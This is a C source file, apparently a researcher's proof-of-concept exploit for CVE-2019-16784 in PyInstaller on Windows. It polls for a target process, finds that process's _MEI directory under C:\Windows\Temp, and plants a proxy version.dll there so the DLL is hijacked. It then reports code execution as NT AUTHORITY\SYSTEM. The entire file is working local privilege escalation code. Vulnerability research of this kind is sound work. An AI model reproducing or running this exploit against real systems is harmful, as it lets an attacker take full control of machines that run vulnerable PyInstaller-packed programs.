#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <tlHelp32.h>

#define TARGET_EXE  "test.exe"
#define TEMP_DIR    "C:\\Windows\\Temp"
#define DLL_DIR     "C:\\Users\\ckrielle\\Documents\\Hacking\\Research\\POCs\\CVE-2019-16784\\exploit\\dlls\\"
#define PROXY_DLL   "version.dll" // compile with DLLProxyProject
#define VERSION_DLL "version2.dll" // copy C:\Windows\System32\version.dll version2.dll

DWORD findPID(char* procname)
{
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap != INVALID_HANDLE_VALUE)
    {
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hProcessSnap, &pe32))
        {
            do
            {
                if (!strcmp(procname, pe32.szExeFile))
                    return pe32.th32ProcessID;
            } while (Process32Next(hProcessSnap, &pe32));
        }
        CloseHandle(hProcessSnap);
    }

    return -1;
}

WORD findDir(char* dir, DWORD pid)
{
    HANDLE fileHndl;
    int i;
    DWORD dwAttrib;
    char fileDir[MAX_PATH];

    for (i = 0; i < 10; i++)
    {
        snprintf(dir, MAX_PATH, "%s\\_MEI%d%d\\", TEMP_DIR, pid, i);

        // create a file to test if directory exists, since GetFileAttributes(dir) == FILE_ATTRIBUTE_HIDDEN doesn't work
        snprintf(fileDir, MAX_PATH, "%spepegas", dir);

        fileHndl = CreateFile(fileDir, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
        dwAttrib = GetFileAttributesA(fileDir);
        if (dwAttrib == FILE_ATTRIBUTE_ARCHIVE)
        {
            CloseHandle(fileHndl);
            DeleteFileA(fileDir);
            return 1;
        }
    }

    return 0;
}

void injectDLLs(char *targetDir)
{
    char local_proxy[MAX_PATH], local_version[MAX_PATH];
    char inject_proxy[MAX_PATH], inject_version[MAX_PATH];

    snprintf(local_proxy, MAX_PATH, "%s%s", DLL_DIR, PROXY_DLL);
    snprintf(local_version, MAX_PATH, "%s%s", DLL_DIR, VERSION_DLL);

    snprintf(inject_proxy, MAX_PATH, "%s%s", targetDir, PROXY_DLL);
    snprintf(inject_version, MAX_PATH, "%s%s", targetDir, VERSION_DLL);

    CopyFile(local_proxy, inject_proxy, FALSE);
    CopyFile(local_version, inject_version, FALSE);
}

int main()
{
    DWORD pid = -1;
    char dir[MAX_PATH];

    printf("[*] Exploiting CVE-2019-16784\n");

    printf("[*] Finding the PyInstaller Executable PID\n");
    while (TRUE)
        if ((pid = findPID(TARGET_EXE)) != -1)
            break;
    printf("[*] Found PID: %d\n", pid);
    Sleep(50); // necessary for exploit to work

    printf("[*] Finding _MEI%dX Directory\n", pid);
    if (!findDir(dir, pid))
    {
        printf("[*] Directory not found, exploit failed. exiting...\n");
        exit(2);
    }
    printf("[*] Found Directory: %s\n", dir);

    printf("[*] Injecting DLL\n");
    injectDLLs(dir);
    printf("[*] Got Code Execution as NT AUTHORITY\\SYSTEM\n");
    
    return 0;
}